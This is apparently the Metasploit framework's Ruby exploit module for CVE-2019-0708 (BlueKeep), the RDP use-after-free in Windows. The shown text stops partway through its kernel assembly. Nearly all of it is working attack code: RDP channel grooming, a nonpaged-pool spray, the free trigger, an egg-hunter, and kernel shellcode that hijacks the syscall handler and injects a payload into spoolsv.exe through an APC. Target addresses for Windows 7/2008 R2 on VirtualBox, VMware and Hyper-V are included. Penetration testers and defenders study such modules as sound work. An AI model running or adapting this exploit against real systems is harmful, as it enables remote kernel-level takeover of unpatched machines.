##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

#  Exploitation and Caveats from zerosum0x0:
#
#    1. Register with channel MS_T120 (and others such as RDPDR/RDPSND) nominally.
#    2. Perform a full RDP handshake, I like to wait for RDPDR handshake too (code in the .py)
#    3. Free MS_T120 with the DisconnectProviderIndication message to MS_T120.
#    4. RDP has chunked messages, so we use this to groom.
#       a. Chunked messaging ONLY works properly when sent to RDPSND/MS_T120.
#       b. However, on 7+, MS_T120 will not work and you have to use RDPSND.
#           i. RDPSND only works when
#              HKLM\SYSTEM\CurrentControlSet\Control\TerminalServer\Winstations\RDP-Tcp\fDisableCam = 0
#           ii. This registry key is not a default setting for server 2008 R2. SHITTY ISSUE
#    5. Use chunked grooming to fit new data in the freed channel, account for
#       the allocation header size (like 0x38 I think?). At offset 0x100? is where
#       the "call [rax]" gadget will get its pointer from.
#       a. The NonPagedPool (NPP) starts at a fixed address on XP-7
#           i. Hot-swap memory is another SHITTY ISSUE. With certain VMWare and
#           Hyper-V setups, the OS allocates a buncha PTE stuff before the NPP
#           start. This can be anywhere from 100 mb to gigabytes of offset
#           before the NPP start.
#       b. Set offset 0x100 to NPPStart+SizeOfGroomInMB
#       c. Groom chunk the shellcode, at *(NPPStart+SizeOfGroomInMB) you need
#          [NPPStart+SizeOfGroomInMB+8...payload]... because "call [rax]" is an
#          indirect call
#       d. We are limited to 0x400 payloads by channel chunk max size. My
#          current shellcode is a twin shellcode with eggfinders. I spam the
#          kernel payload and user payload, and if user payload is called first it
#          will egghunt for the kernel payload.
#    6. After channel hole is filled and the NPP is spammed up with shellcode,
#       trigger the free by closing the socket.
#
#    TODO:
#    * Detect OS specifics / obtain memory leak to determine NPP start address.
#    * Write the XP/2003 portions grooming MS_T120.
#    * Detect if RDPSND grooming is working or not?
#    * Expand channels besides RDPSND/MS_T120 for grooming.
#        See https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/
#
#    https://github.com/0xeb-bp/bluekeep .. this repo has code for grooming
#    MS_T120 on XP... should be same process as the RDPSND

class MetasploitModule < Msf::Exploit::Remote

  Rank = ManualRanking

  USERMODE_EGG = 0xb00dac0fefe31337
  KERNELMODE_EGG = 0xb00dac0fefe42069

  CHUNK_SIZE = 0x400
  HEADER_SIZE = 0x48

  include Msf::Exploit::Remote::RDP
  include Msf::Exploit::Remote::CheckScanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free',
      'Description'    => %q(
        The RDP termdd.sys driver improperly handles binds to internal-only channel MS_T120,
        allowing a malformed Disconnect Provider Indication message to cause use-after-free.
        With a controllable data/size remote nonpaged pool spray, an indirect call gadget of
        the freed channel is used to achieve arbitrary code execution.
      ),
      'Author' =>
      [
        'Sean Dillon <sean.dillon@risksense.com>',  # @zerosum0x0 - Original exploit
        'Ryan Hanson <dunno@findthisout.com>',      # @ryHanson - Original exploit
        'OJ Reeves <oj@beyondbinary.io>',           # @TheColonial - Metasploit module
        'Brent Cook <bcook@rapid7.com>',            # @busterbcook - Assembly whisperer
      ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          ['CVE', '2019-0708'],
          ['URL', 'https://github.com/zerosum0x0/CVE-2019-0708'],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
          'WfsDelay' => 5,
          'RDP_CLIENT_NAME' => 'ethdev',
          'CheckScanner' => 'auxiliary/scanner/rdp/cve_2019_0708_bluekeep'
        },
      'Privileged' => true,
      'Payload' =>
        {
          'Space' => CHUNK_SIZE - HEADER_SIZE,
          'EncoderType' => Msf::Encoder::Type::Raw,
        },
      'Platform' => 'win',
      'Targets' =>
        [
          [
            'Automatic targeting via fingerprinting',
            {
              'Arch' => [ARCH_X64],
              'FingerprintOnly' => true
            },
          ],
          #
          #
          # Windows 2008 R2 requires the following registry change from default:
          #
          # [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Terminal Server\WinStations\rdpwd]
          # "fDisableCam"=dword:00000000
          #
          [
            'Windows 7 SP1 / 2008 R2 (6.1.7601 x64)',
            {
              'Platform' => 'win',
              'Arch' => [ARCH_X64],
              'GROOMBASE' => 0xfffffa8003800000
            }
          ],
          [
            # This works with Virtualbox 6
            'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox)',
            {
              'Platform' => 'win',
              'Arch' => [ARCH_X64],
              'GROOMBASE' => 0xfffffa8002407000
            }
          ],
          [
            # This address works on VMWare 15 on Windows.
            'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare)',
            {
              'Platform' => 'win',
              'Arch' => [ARCH_X64],
              'GROOMBASE' => 0xfffffa8018C00000
              #'GROOMBASE' => 0xfffffa801C000000
            }
          ],
          [
            'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)',
            {
              'Platform' => 'win',
              'Arch' => [ARCH_X64],
              'GROOMBASE' => 0xfffffa8102407000
            }
          ],
        ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'May 14 2019',
      'Notes' =>
        {
          'AKA' => ['Bluekeep']
        }
    ))

    register_advanced_options(
      [
        OptBool.new('ForceExploit', [false, 'Override check result', false]),
        OptInt.new('GROOMSIZE', [true, 'Size of the groom in MB', 250]),
        OptEnum.new('GROOMCHANNEL', [true, 'Channel to use for grooming', 'RDPSND', ['RDPSND', 'MS_T120']]),
        OptInt.new('GROOMCHANNELCOUNT', [true, 'Number of channels to groom', 1]),
      ]
    )
  end

  def exploit
    unless check == CheckCode::Vulnerable || datastore['ForceExploit']
      fail_with(Failure::NotVulnerable, 'Set ForceExploit to override')
    end

    if target['FingerprintOnly']
      fail_with(Msf::Module::Failure::BadConfig, 'Set the most appropriate target manually')
    end

    begin
      rdp_connect
    rescue ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError
      fail_with(Msf::Module::Failure::Unreachable, 'Unable to connect to RDP service')
    end

    is_rdp, server_selected_proto = rdp_check_protocol
    unless is_rdp
      fail_with(Msf::Module::Failure::Unreachable, 'Unable to connect to RDP service')
    end

    # We don't currently support NLA in the mixin or the exploit. However, if we have valid creds, NLA shouldn't stop us
    # from exploiting the target.
    if [RDPConstants::PROTOCOL_HYBRID, RDPConstants::PROTOCOL_HYBRID_EX].include?(server_selected_proto)
      fail_with(Msf::Module::Failure::BadConfig, 'Server requires NLA (CredSSP) security which mitigates this vulnerability.')
    end

    chans = [
      ['rdpdr', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP],
      [datastore['GROOMCHANNEL'], RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP],
      [datastore['GROOMCHANNEL'], RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP],
      ['MS_XXX0', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL],
      ['MS_XXX1', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL],
      ['MS_XXX2', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL],
      ['MS_XXX3', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL],
      ['MS_XXX4', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL],
      ['MS_XXX5', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL],
      ['MS_T120', RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL],
    ]

    @mst120_chan_id = 1004 + chans.length - 1

    unless rdp_negotiate_security(chans, server_selected_proto)
      fail_with(Msf::Module::Failure::Unknown, 'Negotiation of security failed.')
    end

    rdp_establish_session

    rdp_dispatch_loop
  end

private

  # This function is invoked when the PAKID_CORE_CLIENTID_CONFIRM message is
  # received on a channel, and this is when we need to kick off our exploit.
  def rdp_on_core_client_id_confirm(pkt, user, chan_id, flags, data)
    # We have to do the default behaviour first.
    super(pkt, user, chan_id, flags, data)

    groom_size = datastore['GROOMSIZE']
    pool_addr = target['GROOMBASE'] + (CHUNK_SIZE * 1024 * groom_size)
    groom_chan_count = datastore['GROOMCHANNELCOUNT']

    payloads = create_payloads(pool_addr)

    print_status("Using CHUNK grooming strategy. Size #{groom_size}MB, target address 0x#{pool_addr.to_s(16)}, Channel count #{groom_chan_count}.")

    target_channel_id = chan_id + 1

    spray_buffer = create_exploit_channel_buffer(pool_addr)
    spray_channel = rdp_create_channel_msg(self.rdp_user_id, target_channel_id, spray_buffer, 0, 0xFFFFFFF)
    free_trigger = spray_channel * 20 + create_free_trigger(self.rdp_user_id, @mst120_chan_id) + spray_channel * 80

    print_status("Surfing channels ...")
    rdp_send(spray_channel * 1024)
    rdp_send(free_trigger)

    chan_surf_size = 0x421
    spray_packets = (chan_surf_size / spray_channel.length) + [1, chan_surf_size % spray_channel.length].min
    chan_surf_packet = spray_channel * spray_packets
    chan_surf_count  = chan_surf_size / spray_packets

    chan_surf_count.times do
      rdp_send(chan_surf_packet)
    end

    print_status("Lobbing eggs ...")

    groom_mb = groom_size * 1024 / payloads.length

    groom_mb.times do
      tpkts = ''
      for c in 0..groom_chan_count
        payloads.each do |p|
          tpkts += rdp_create_channel_msg(self.rdp_user_id, target_channel_id + c, p, 0, 0xFFFFFFF)
        end
      end
      rdp_send(tpkts)
    end

    # Terminating and disconnecting forces the USE
    print_status("Forcing the USE of FREE'd object ...")
    rdp_terminate
    rdp_disconnect
  end

  # Helper function to create the kernel mode payload and the usermode payload with
  # the egg hunter prefix.
  def create_payloads(pool_address)
    begin
      [kernel_mode_payload, user_mode_payload].map { |p|
        [
          pool_address + HEADER_SIZE + 0x10, # indirect call gadget, over this pointer + egg
          p
        ].pack('<Qa*').ljust(CHUNK_SIZE - HEADER_SIZE, "\x00")
      }
    rescue => ex
      print_error("#{ex.backtrace.join("\n")}: #{ex.message} (#{ex.class})")
    end
  end

  def assemble_with_fixups(asm)
    # Rewrite all instructions of form 'lea reg, [rel label]' as relative
    # offsets for the instruction pointer, since metasm's 'ModRM' parser does
    # not grok that syntax.
    lea_rel = /lea+\s(?<dest>\w{2,3}),*\s\[rel+\s(?<label>[a-zA-Z_].*)\]/
    asm.gsub!(lea_rel) do |match|
      match = "lea #{$1}, [rip + #{$2}]"
    end

    # metasm encodes all rep instructions as repnz
    # https://github.com/jjyg/metasm/pull/40
    asm.gsub!(/rep+\smovsb/, 'db 0xf3, 0xa4')

    encoded = Metasm::Shellcode.assemble(Metasm::X64.new, asm).encoded

    # Fixup above rewritten instructions with the relative label offsets
    encoded.reloc.each do |offset, reloc|
      target = reloc.target.to_s
      if encoded.export.key?(target)
        # Note: this assumes the address we're fixing up is at the end of the
        # instruction. This holds for 'lea' but if there are other fixups
        # later, this might need to change to account for specific instruction
        # encodings
        if reloc.type == :i32
          instr_offset = offset + 4
        elsif reloc.type == :i16
          instr_offset = offset + 2
        end
        encoded.fixup(target => encoded.export[target] - instr_offset)
      else
        raise "Unknown symbol '#{target}' while resolving relative offsets"
      end
    end
    encoded.fill
    encoded.data
  end

  # The user mode payload has two parts. The first is an egg hunter that searches for
  # the kernel mode payload. The second part is the actual payload that's invoked in
  # user land (ie. it's injected into spoolsrv.exe). We need to spray both the kernel
  # and user mode payloads around the heap in different packets because we don't have
  # enough space to put them both in the same chunk. Given that code exec can result in
  # landing on the user land payload, the egg is used to go to a kernel payload.
  def user_mode_payload

    # Windows x64 kernel shellcode from ring 0 to ring 3 by sleepya
    #
    # This shellcode was written originally for eternalblue exploits
    # eternalblue_exploit7.py and eternalblue_exploit8.py
    #
    # Idea for Ring 0 to Ring 3 via APC from Sean Dillon (@zerosum0x0)
    #
    # Note:
    # - The userland shellcode is run in a new thread of system process.
    #     If userland shellcode causes any exception, the system process get killed.
    # - On idle target with multiple core processors, the hijacked system call
    #     might take a while (> 5 minutes) to get called because the system
    #     call may be called on other processors.
    # - The shellcode does not allocate shadow stack if possible for minimal shellcode size.
    #     This is ok because some Windows functions do not require a shadow stack.
    # - Compiling shellcode with specific Windows version macro, corrupted buffer will be freed.
    #     Note: the Windows 8 version macros are removed below
    # - The userland payload MUST be appened to this shellcode.
    #
    # References:
    # - http://www.geoffchappell.com/studies/windows/km/index.htm (structures info)
    # - https://github.com/reactos/reactos/blob/master/reactos/ntoskrnl/ke/apc.c

    asm = %Q^
_start:
    lea rcx, [rel _start]
    mov r8, 0x#{KERNELMODE_EGG.to_s(16)}
_egg_loop:
    sub rcx, 0x#{CHUNK_SIZE.to_s(16)}
    sub rax, 0x#{CHUNK_SIZE.to_s(16)}
    mov rdx, [rcx - 8]
    cmp rdx, r8
    jnz _egg_loop
    jmp rcx
    ^
    egg_loop = assemble_with_fixups(asm)

    # The USERMODE_EGG is required at the start as well, because the exploit code
    # assumes the tag is there, and jumps over it to find the shellcode.
    [
      USERMODE_EGG,
      egg_loop,
      USERMODE_EGG,
      payload.raw
    ].pack('<Qa*<Qa*')
  end

  def kernel_mode_payload
    data_kapc_offset           = 0x10
    data_nt_kernel_addr_offset = 0x8
    data_origin_syscall_offset = 0
    data_peb_addr_offset       = -0x10
    data_queueing_kapc_offset  = -0x8
    hal_heap_storage           = 0xffffffffffd04100

    # These hashes are not the same as the ones used by the
    # Block API so they have to be hard-coded.
    createthread_hash              = 0x835e515e
    keinitializeapc_hash           = 0x6d195cc4
    keinsertqueueapc_hash          = 0xafcc4634
    psgetcurrentprocess_hash       = 0xdbf47c78
    psgetprocessid_hash            = 0x170114e1
    psgetprocessimagefilename_hash = 0x77645f3f
    psgetprocesspeb_hash           = 0xb818b848
    psgetthreadteb_hash            = 0xcef84c3e
    spoolsv_exe_hash               = 0x3ee083d8
    zwallocatevirtualmemory_hash   = 0x576e99ea

    asm = %Q^
shellcode_start:
    nop
    nop
    nop
    nop
    ; IRQL is DISPATCH_LEVEL when got code execution

    push rbp

    call set_rbp_data_address_fn

    ; read current syscall
    mov ecx, 0xc0000082
    rdmsr
    ; do NOT replace saved original syscall address with hook syscall
    lea r9, [rel syscall_hook]
    cmp eax, r9d
    je _setup_syscall_hook_done

    ; if (saved_original_syscall != &KiSystemCall64) do_first_time_initialize
    cmp dword [rbp+#{data_origin_syscall_offset}], eax
    je _hook_syscall

    ; save original syscall
    mov dword [rbp+#{data_origin_syscall_offset}+4], edx
    mov dword [rbp+#{data_origin_syscall_offset}], eax

    ; first time on the target
    mov byte [rbp+#{data_queueing_kapc_offset}], 0

_hook_syscall:
    ; set a new syscall on running processor
    ; setting MSR 0xc0000082 affects only running processor
    xchg r9, rax
    push rax
    pop rdx     ; mov rdx, rax
    shr rdx, 32
    wrmsr

_setup_syscall_hook_done:
    pop rbp

;--------------------- HACK crappy thread cleanup --------------------
; This code is effectively the same as the epilogue of the function that calls
; the vulnerable function in the kernel, with a tweak or two.

    ; TODO: make the lock not suck!!
    mov     rax, qword [gs:0x188]
    add     word [rax+0x1C4], 1       ; KeGetCurrentThread()->KernelApcDisable++
    lea     r11, [rsp+0b8h]
    xor     eax, eax
    mov     rbx, [r11+30h]
    mov     rbp, [r11+40h]
    mov     rsi, [r11+48h]
    mov     rsp, r11
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rdi
    ret

;--------------------- END HACK crappy thread cleanup

;========================================================================
; Find memory address in HAL heap for using as data area
; Return: rbp = data address
;========================================================================
set_rbp_data_address_fn:
    ; On idle target without user application, syscall on hijacked processor might not be called immediately.
    ; Find some address to store the data, the data in this address MUST not be modified
    ;   when exploit is rerun before syscall is called
    ;lea rbp, [rel _set_rbp_data_address_fn_next + 0x1000]

    ; ------ HACK rbp wasnt valid!

    mov rbp, #{hal_heap_storage}    ; TODO: use some other buffer besides HAL heap??

    ; --------- HACK end rbp

_set_rbp_data_address_fn_next:
    ;shr rbp, 12
    ;shl rbp, 12
    ;sub rbp, 0x70   ; for KAPC struct too
    ret

    ;int 3
    ;call $+5
    ;pop r13
syscall_hook:
    swapgs
    mov qword [gs:0x10], rsp
    mov rsp, qword [gs:0x1a8]
    push 0x2b
    push qword [gs:0x10]

    push rax    ; want this stack space to store original syscall addr
    ; save rax first to make this function continue to real syscall
    push rax
    push rbp    ; save rbp here because rbp is special register for accessing this shellcode data
    call set_rbp_data_address_fn
    mov rax, [rbp+#{data_origin_syscall_offset}]
    add rax, 0x1f   ; adjust syscall entry, so we do not need to reverse start of syscall handler
    mov [rsp+0x10], rax

    ; save all volatile registers
    push rcx
    push rdx
    push r8
    push r9
    push r10
    push r11

    ; use lock cmpxchg for queueing APC only one at a time
    xor eax, eax
    mov dl, 1
    lock cmpxchg byte [rbp+#{data_queueing_kapc_offset}], dl
    jnz _syscall_hook_done

    ;======================================
    ; restore syscall
    ;======================================
    ; an error after restoring syscall should never occur
    mov ecx, 0xc0000082
    mov eax, [rbp+#{data_origin_syscall_offset}]
    mov edx, [rbp+#{data_origin_syscall_offset}+4]
    wrmsr

    ; allow interrupts while executing shellcode
    sti
    call r3_to_r0_start
    cli

_syscall_hook_done:
    pop r11
    pop r10
    pop r9
    pop r8
    pop rdx
    pop rcx
    pop rbp
    pop rax
    ret

r3_to_r0_start:
    ; save used non-volatile registers
    push r15
    push r14
    push rdi
    push rsi
    push rbx
    push rax    ; align stack by 0x10

    ;======================================
    ; find nt kernel address
    ;======================================
    mov r15, qword [rbp+#{data_origin_syscall_offset}]      ; KiSystemCall64 is an address in nt kernel
    shr r15, 0xc                ; strip to page size
    shl r15, 0xc

_x64_find_nt_walk_page:
    sub r15, 0x1000             ; walk along page size
    cmp word [r15], 0x5a4d      ; 'MZ' header
    jne _x64_find_nt_walk_page

    ; save nt address for using in KernelApcRoutine
    mov [rbp+#{data_nt_kernel_addr_offset}], r15

    ;======================================
    ; get current EPROCESS and ETHREAD
    ;======================================
    mov r14, qword [gs:0x188]    ; get _ETHREAD pointer from KPCR
    mov edi, #{psgetcurrentprocess_hash}
    call win_api_direct
    xchg rcx, rax       ; rcx = EPROCESS

    ; r15 : nt kernel address
    ; r14 : ETHREAD
    ; rcx : EPROCESS

    ;======================================
    ; find offset of EPROCESS.ImageFilename
    ;======================================
    mov edi, #{psgetprocessimagefilename_hash}
    call get_proc_addr
    mov eax, dword [rax+3]  ; get offset from code (offset of ImageFilename is always > 0x7f)
    mov ebx, eax        ; ebx = offset of EPROCESS.ImageFilename


    ;======================================
    ; find offset of EPROCESS.ThreadListHead
    ;======================================
    ; possible diff from ImageFilename offset is 0x28 and 0x38 (Win8+)
    ; if offset of ImageFilename is more than 0x400, current is (Win8+)

    cmp eax, 0x400      ; eax is still an offset of EPROCESS.ImageFilename
    jb _find_eprocess_threadlist_offset_win7
    add eax, 0x10
_find_eprocess_threadlist_offset_win7:
    lea rdx, [rax+0x28] ; edx = offset of EPROCESS.ThreadListHead

    ;======================================
    ; find offset of ETHREAD.ThreadListEntry
    ;======================================

    lea r8, [rcx+rdx]   ; r8 = address of EPROCESS.ThreadListHead
    mov r9, r8

    ; ETHREAD.ThreadListEntry must be between ETHREAD (r14) and ETHREAD+0x700
_find_ethread_threadlist_offset_loop:
    mov r9, qword [r9]

    cmp r8, r9          ; check end of list
    je _insert_queue_apc_done    ; not found !!!

    ; if (r9 - r14 < 0x700) found
    mov rax, r9
    sub rax, r14
    cmp rax, 0x700
    ja _find_ethread_threadlist_offset_loop
    sub r14, r9         ; r14 = -(offset of ETHREAD.ThreadListEntry)


    ;======================================
    ; find offset of EPROCESS.ActiveProcessLinks
    ;======================================
    mov edi, #{psgetprocessid_hash}
    call get_proc_addr
    mov edi, dword [rax+3]  ; get offset from code (offset of UniqueProcessId is always > 0x7f)
    add edi, 8      ; edi = offset of EPROCESS.ActiveProcessLinks = offset of EPROCESS.UniqueProcessId + sizeof(EPROCESS.UniqueProcessId)


    ;======================================
    ; find target process by iterating over EPROCESS.ActiveProcessLinks WITHOUT lock
    ;======================================
    ; check process name


    xor eax, eax      ; HACK to exit earlier if process not found

_find_target_process_loop:
    lea rsi, [rcx+rbx]

    push rax
    call calc_hash
    cmp eax, #{spoolsv_exe_hash}  ; "spoolsv.exe"
    pop rax
    jz found_target_process

;---------- HACK PROCESS NOT FOUND start -----------
    inc rax
    cmp rax, 0x300      ; HACK not found!
    jne _next_find_target_process
    xor ecx, ecx
    ; clear queueing kapc flag, allow other hijacked system call to run shellcode
    mov byte [rbp+#{data_queueing_kapc_offset}], cl

    jmp _r3_to_r0_done

;---------- HACK PROCESS NOT FOUND end -----------

_next_find_target_process:
    ; next process
    mov rcx, [rcx+rdi]
    sub rcx, rdi
    jmp _find_target_process_loop


found_target_process:
    ; The allocation for userland payload will be in KernelApcRoutine.
    ; KernelApcRoutine is run in a target process context. So no need to use KeStackAttachProcess()

    ;======================================
    ; save process PEB for finding CreateThread address in kernel KAPC routine
    ;======================================
    mov edi, #{psgetprocesspeb_hash}
    ; rcx is EPROCESS. no need to set it.
    call win_api_direct
    mov [rbp+#{data_peb_addr_offset}], rax


    ;======================================
    ; iterate ThreadList until KeInsertQueueApc() success
    ;======================================
    ; r15 = nt
    ; r14 = -(offset of ETHREAD.ThreadListEntry)
    ; rcx = EPROCESS
    ; edx = offset of EPROCESS.ThreadListHead


    lea rsi, [rcx + rdx]    ; rsi = ThreadListHead address
    mov rbx, rsi    ; use rbx for iterating thread

    ; checking alertable from ETHREAD structure is not reliable because each Windows version has different offset.
    ; Moreover, alertable thread need to be waiting state which is more difficult to check.
    ; try queueing APC then check KAPC member is more reliable.

_insert_queue_apc_loop:
    ; move backward because non-alertable and NULL TEB.ActivationContextStackPointer threads always be at front
    mov rbx, [rbx+8]

    cmp rsi, rbx
    je _insert_queue_apc_loop   ; skip list head

    ; find start of ETHREAD address
    ; set it to rdx to be used for KeInitializeApc() argument too
    lea rdx, [rbx + r14]    ; ETHREAD

    ; userland shellcode (at least CreateThread() function) need non NULL TEB.ActivationContextStackPointer.
    ; the injected process will be crashed because of access violation if TEB.ActivationContextStackPointer is NULL.
    ; Note: APC routine does not require non-NULL TEB.ActivationContextStackPointer.
    ; from my observation, KTRHEAD.Queue is always NULL when TEB.ActivationContextStackPointer is NULL.
    ; Teb member is next to Queue member.
    mov edi, #{psgetthreadteb_hash}
    call get_proc_addr
    mov eax, dword [rax+3]      ; get offset from code (offset of Teb is always > 0x7f)
    cmp qword [rdx+rax-8], 0    ; KTHREAD.Queue MUST not be NULL
    je _insert_queue_apc_loop

    ; KeInitializeApc(PKAPC,
    ;                 PKTHREAD,
    ;                 KAPC_ENVIRONMENT = OriginalApcEnvironment (0),
    ;                 PKKERNEL_ROUTINE = kernel_apc_routine,
    ;                 PKRUNDOWN_ROUTINE = NULL,
    ;                 PKNORMAL_ROUTINE = userland_shellcode,
    ;                 KPROCESSOR_MODE = UserMode (1),
    ;                 PVOID Context);
    lea rcx, [rbp+#{data_kapc_offset}]     ; PAKC
    xor r8, r8      ; OriginalApcEnvironment
    lea r9, [rel kernel_kapc_routine]    ; KernelApcRoutine
    push rbp    ; context
    push 1      ; UserMode
    push rbp    ; userland shellcode (MUST NOT be NULL)
    push r8     ; NULL
    sub rsp, 0x20   ; shadow stack
    mov edi, #{keinitializeapc_hash}
    call win_api_direct
    ; Note: KeInsertQueueApc() requires shadow stack. Adjust stack back later

    ; BOOLEAN KeInsertQueueApc(PKAPC, SystemArgument1, SystemArgument2, 0);
    ;   SystemArgument1 is second argument in usermode code (rdx)
    ;   SystemArgument2 is third argument in usermode code (r8)
    lea rcx, [rbp+#{data_kapc_offset}]
    ;xor edx, edx   ; no need to set it here
    ;xor r8, r8     ; no need to set it here
    xor r9, r9
    mov edi, #{keinsertqueueapc_hash}
    call win_api_direct
    add rsp, 0x40
    ; if insertion failed, try next thread
    test eax, eax
    jz _insert_queue_apc_loop

    mov rax, [rbp+#{data_kapc_offset}+0x10]     ; get KAPC.ApcListEntry
    ; EPROCESS pointer 8 bytes
    ; InProgressFlags 1 byte
    ; KernelApcPending 1 byte
    ; if success, UserApcPending MUST be 1
    cmp byte [rax+0x1a], 1
    je _insert_queue_apc_done

    ; manual remove list without lock
    mov [rax], rax
    mov [rax+8], rax
    jmp _insert_queue_apc_loop

_insert_queue_apc_done:
    ; The PEB address is needed in kernel_apc_routine. Setting QUEUEING_KAPC to 0 should be in kernel_apc_routine.

_r3_to_r0_done:
    pop rax
    pop rbx
    pop rsi
    pop rdi
    pop r14
    pop r15
    ret

;========================================================================
; Call function in specific module
;
; All function arguments are passed as calling normal function with extra register arguments
; Extra Arguments: r15 = module pointer
;                  edi = hash of target function name
;========================================================================
win_api_direct:
    call get_proc_addr
    jmp rax


;========================================================================
; Get function address in specific module
;
; Arguments: r15 = module pointer
;            edi = hash of target function name
; Return: eax = offset
;========================================================================
get_proc_addr:
    ; Save registers
    push rbx
    push rcx
    push rsi                ; for using calc_hash

    ; use rax to find EAT
    mov eax, dword [r15+60]  ; Get PE header e_lfanew
    mov eax, dword [r15+rax+136] ; Get export tables RVA

    add rax, r15
    push rax                 ; save EAT

    mov ecx, dword [rax+24]  ; NumberOfFunctions
    mov ebx, dword [rax+32]  ; FunctionNames
    add rbx, r15

_get_proc_addr_get_next_func:
    ; When we reach the start of the EAT (we search backwards), we hang or crash
    dec ecx                     ; decrement NumberOfFunctions
    mov esi, dword [rbx+rcx*4]  ; Get rva of next module name
    add rsi, r15                ; Add the modules base address

    call calc_hash

    cmp eax, edi                        ; Compare the hashes
    jnz _get_proc_addr_get_next_func    ; try the next function

_get_proc_addr_finish:
    pop rax                     ; restore EAT
    mov ebx, dword [rax+36]
    add rbx, r15                ; ordinate table virtual address
    mov cx, word [rbx+rcx*2]    ; desired functions ordinal
    mov ebx, dword [rax+28]     ; Get the function addresses table rva
    add rbx, r15                ; Add the modules base address
    mov eax, dword [rbx+rcx*4]  ; Get the desired functions RVA
    add rax, r15                ; Add the modules base address to get the functions actual VA

    pop rsi
    pop rcx
    pop rbx
    ret

;========================================================================
; Calculate ASCII string hash. Useful for comparing ASCII string in shellcode.
;
; Argument: rsi = string to hash
; Clobber: rsi
; Return: eax = hash
;========================================================================
calc_hash:
    push rdx
    xor eax, eax
    cdq
_calc_hash_loop:
    lodsb                   ; Read in the next byte of the ASCII string
    ror edx, 13             ; Rotate right our hash value
    add edx, eax            ; Add the next byte of the string
    test eax, eax           ; Stop when found NULL
    jne _calc_hash_loop
    xchg edx, eax
    pop rdx
    ret


; KernelApcRoutine is called when IRQL is APC_LEVEL in (queued) Process context.
; But the IRQL is simply raised from PASSIVE_LEVEL in KiCheckForKernelApcDelivery().
; Moreover, there is no lock when calling KernelApcRoutine.
; So KernelApcRoutine can simply lower the IRQL by setting cr8 register.
;
; VOID KernelApcRoutine(
;           IN PKAPC Apc,
;           IN PKNORMAL_ROUTINE *NormalRoutine,
;           IN PVOID *NormalContext,
;           IN PVOID *SystemArgument1,
;           IN PVOID *SystemArgument2)
kernel_kapc_routine:
    push rbp
    push rbx
    push rdi
    push rsi
    push r15

    mov rbp, [r8]       ; *NormalContext is our data area pointer

    mov r15, [rbp+#{data_nt_kernel_addr_offset}]
    push rdx
    pop rsi     ; mov rsi, rdx
    mov rbx, r9

    ;======================================
    ; ZwAllocateVirtualMemory(-1, &baseAddr, 0, &0x1000, 0x1000, 0x40)
    ;======================================
    xor eax, eax
    mov cr8, rax    ; set IRQL to PASSIVE_LEVEL (ZwAllocateVirtualMemory() requires)
    ; rdx is already address of baseAddr
    mov [rdx], rax      ; baseAddr = 0
    mov ecx, eax
    not rcx             ; ProcessHandle = -1
    mov r8, rax         ; ZeroBits
    mov al, 0x40    ; eax = 0x40
    push rax            ; PAGE_EXECUTE_READWRITE = 0x40
    shl eax, 6      ; eax = 0x40 << 6 = 0x1000
    push rax            ; MEM_COMMIT = 0x1000
    ; reuse r9 for address of RegionSize
    mov [r9], rax       ; RegionSize = 0x1000
    sub rsp, 0x20   ; shadow stack
    mov edi, #{zwallocatevirtualmemory_hash}
    call win_api_direct
    add rsp, 0x30

    ; check error
    test eax, eax
    jnz _kernel_kapc_routine_exit

    ;======================================
    ; copy userland payload
    ;======================================
    mov rdi, [rsi]

;--------------------------- HACK IN EGG USER ---------

    push rdi

    lea rsi, [rel shellcode_start]
    mov rdi, 0x#{USERMODE_EGG.to_s(16)}

  _find_user_egg_loop:
      sub rsi, 0x#{CHUNK_SIZE.to_s(16)}
      mov rax, [rsi - 8]
      cmp rax, rdi
      jnz _find_user_egg_loop

  _inner_find_user_egg_loop:
      inc rsi
      mov rax, [rsi - 8]
      cmp rax, rdi
      jnz _inner_find_user_egg_loop

    pop rdi
;--------------------------- END HACK EGG USER ------------

    mov ecx, 0x380  ; fix payload size to 0x380 bytes

    rep movsb

    ;======================================
    ; find CreateThread address (in kernel32.dll)
    ;======================================
    mov rax, [rbp+#{data_peb_addr_offset}]
